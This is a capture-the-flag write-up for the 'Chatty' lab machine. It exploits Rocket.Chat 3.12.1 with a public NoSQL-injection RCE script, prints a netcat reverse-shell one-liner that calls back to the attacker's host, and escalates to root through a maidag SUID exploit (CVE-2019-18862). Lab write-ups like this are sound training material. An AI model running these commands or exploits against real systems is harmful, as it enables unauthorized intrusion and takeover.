# Chatty

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 1000 192.168.183.164
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 21:32 +08
Warning: 192.168.183.164 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.183.164
Host is up (0.17s latency).
Not shown: 65500 closed tcp ports (conn-refused), 33 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

### Rocket Chat --> Admin Takeover

Port 3000 hosted an instance of Rocket Chat:

<figure><img src="../../../.gitbook/assets/image (722).png" alt=""><figcaption></figcaption></figure>

We can enumerate the version by visiting the `/api/info` page:

```
$ curl http://192.168.183.164:3000/api/info | jq 
{
  "version": "3.12.1",
  "success": true
}
```

This version of Rocket Chat is vulnerable to a NoSQL Injection exploit:

```
$ searchsploit rocket chat 3.12
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Rocket.Chat 3.12.1 - NoSQL Injection (Unauthenticated)     | linux/webapps/49960.py
Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticat | linux/webapps/50108.py
----------------------------------------------------------- ---------------------------------
```

I registered a new account and found the administrator profile of this instance:

<figure><img src="../../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>

We can use `50108.py` to exploit this. Since we created our own low priv user, we can comment the part of the script that resets the low priv user's password:

<figure><img src="../../../.gitbook/assets/image (1867).png" alt=""><figcaption></figcaption></figure>

Then, we also need to change the `password` of the low priv user to the one that we used.&#x20;

<figure><img src="../../../.gitbook/assets/image (3007).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

After running the exploit, we would be given RCE access, and getting a reverse shell is pretty simple:

```
$ python3 50108.py -u 'test@website.com' -a 'admin@chatty.offsec' -t 'http://192.168.183.164:3000'
[+] Succesfully authenticated as test@website.com
Got the code for 2fa: GJLFCKKOOBCVOYSCOJYHCUZ7NAUSUMKYEZAF43RVJ5KC62JYGVYA
[+] Resetting admin@chatty.offsec password
[+] Password Reset Email Sent
[+] Succesfully authenticated as test@website.com
Got the reset token: GsL4Y53r7id414kW7PYJsZVO5YkZkkz4eCvPOrybMkl
[+] Admin password changed !
CMD:> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.184 21 >/tmp/f
[+] Succesfully authenticated as administrator
{"success":false}
```

<figure><img src="../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SUID Binary --> MaiDag CVE

I searched for SUID binaries within the system, and found one that stood out:

```
rocketchat@chatty:~$ find / -perm -u=s -type f 2>/dev/null
<TRUNCATED>
/usr/local/sbin/maidag
```

I didn't recognise `maidag`, and so enumerated it first.&#x20;

```
rocketchat@chatty:~$ /usr/local/sbin/maidag --version
maidag (GNU Mailutils) 3.7
Copyright (C) 2007-2019 Free Software Foundation, inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

Googling the binary and its version returns a Local Privilege Escalation exploit:

{% embed url="https://www.exploit-db.com/exploits/47703" %}

There are online exploits on Github to make this process as easy as possible:

{% embed url="https://github.com/bcoles/local-exploits/tree/master/CVE-2019-18862" %}

I used `exploit.ldpreload.sh` and ran it on the machine. This would spawn a binary `sh` within `/var/tmp` that would give us a `root` shell.&#x20;

<figure><img src="../../../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>

Rooted!
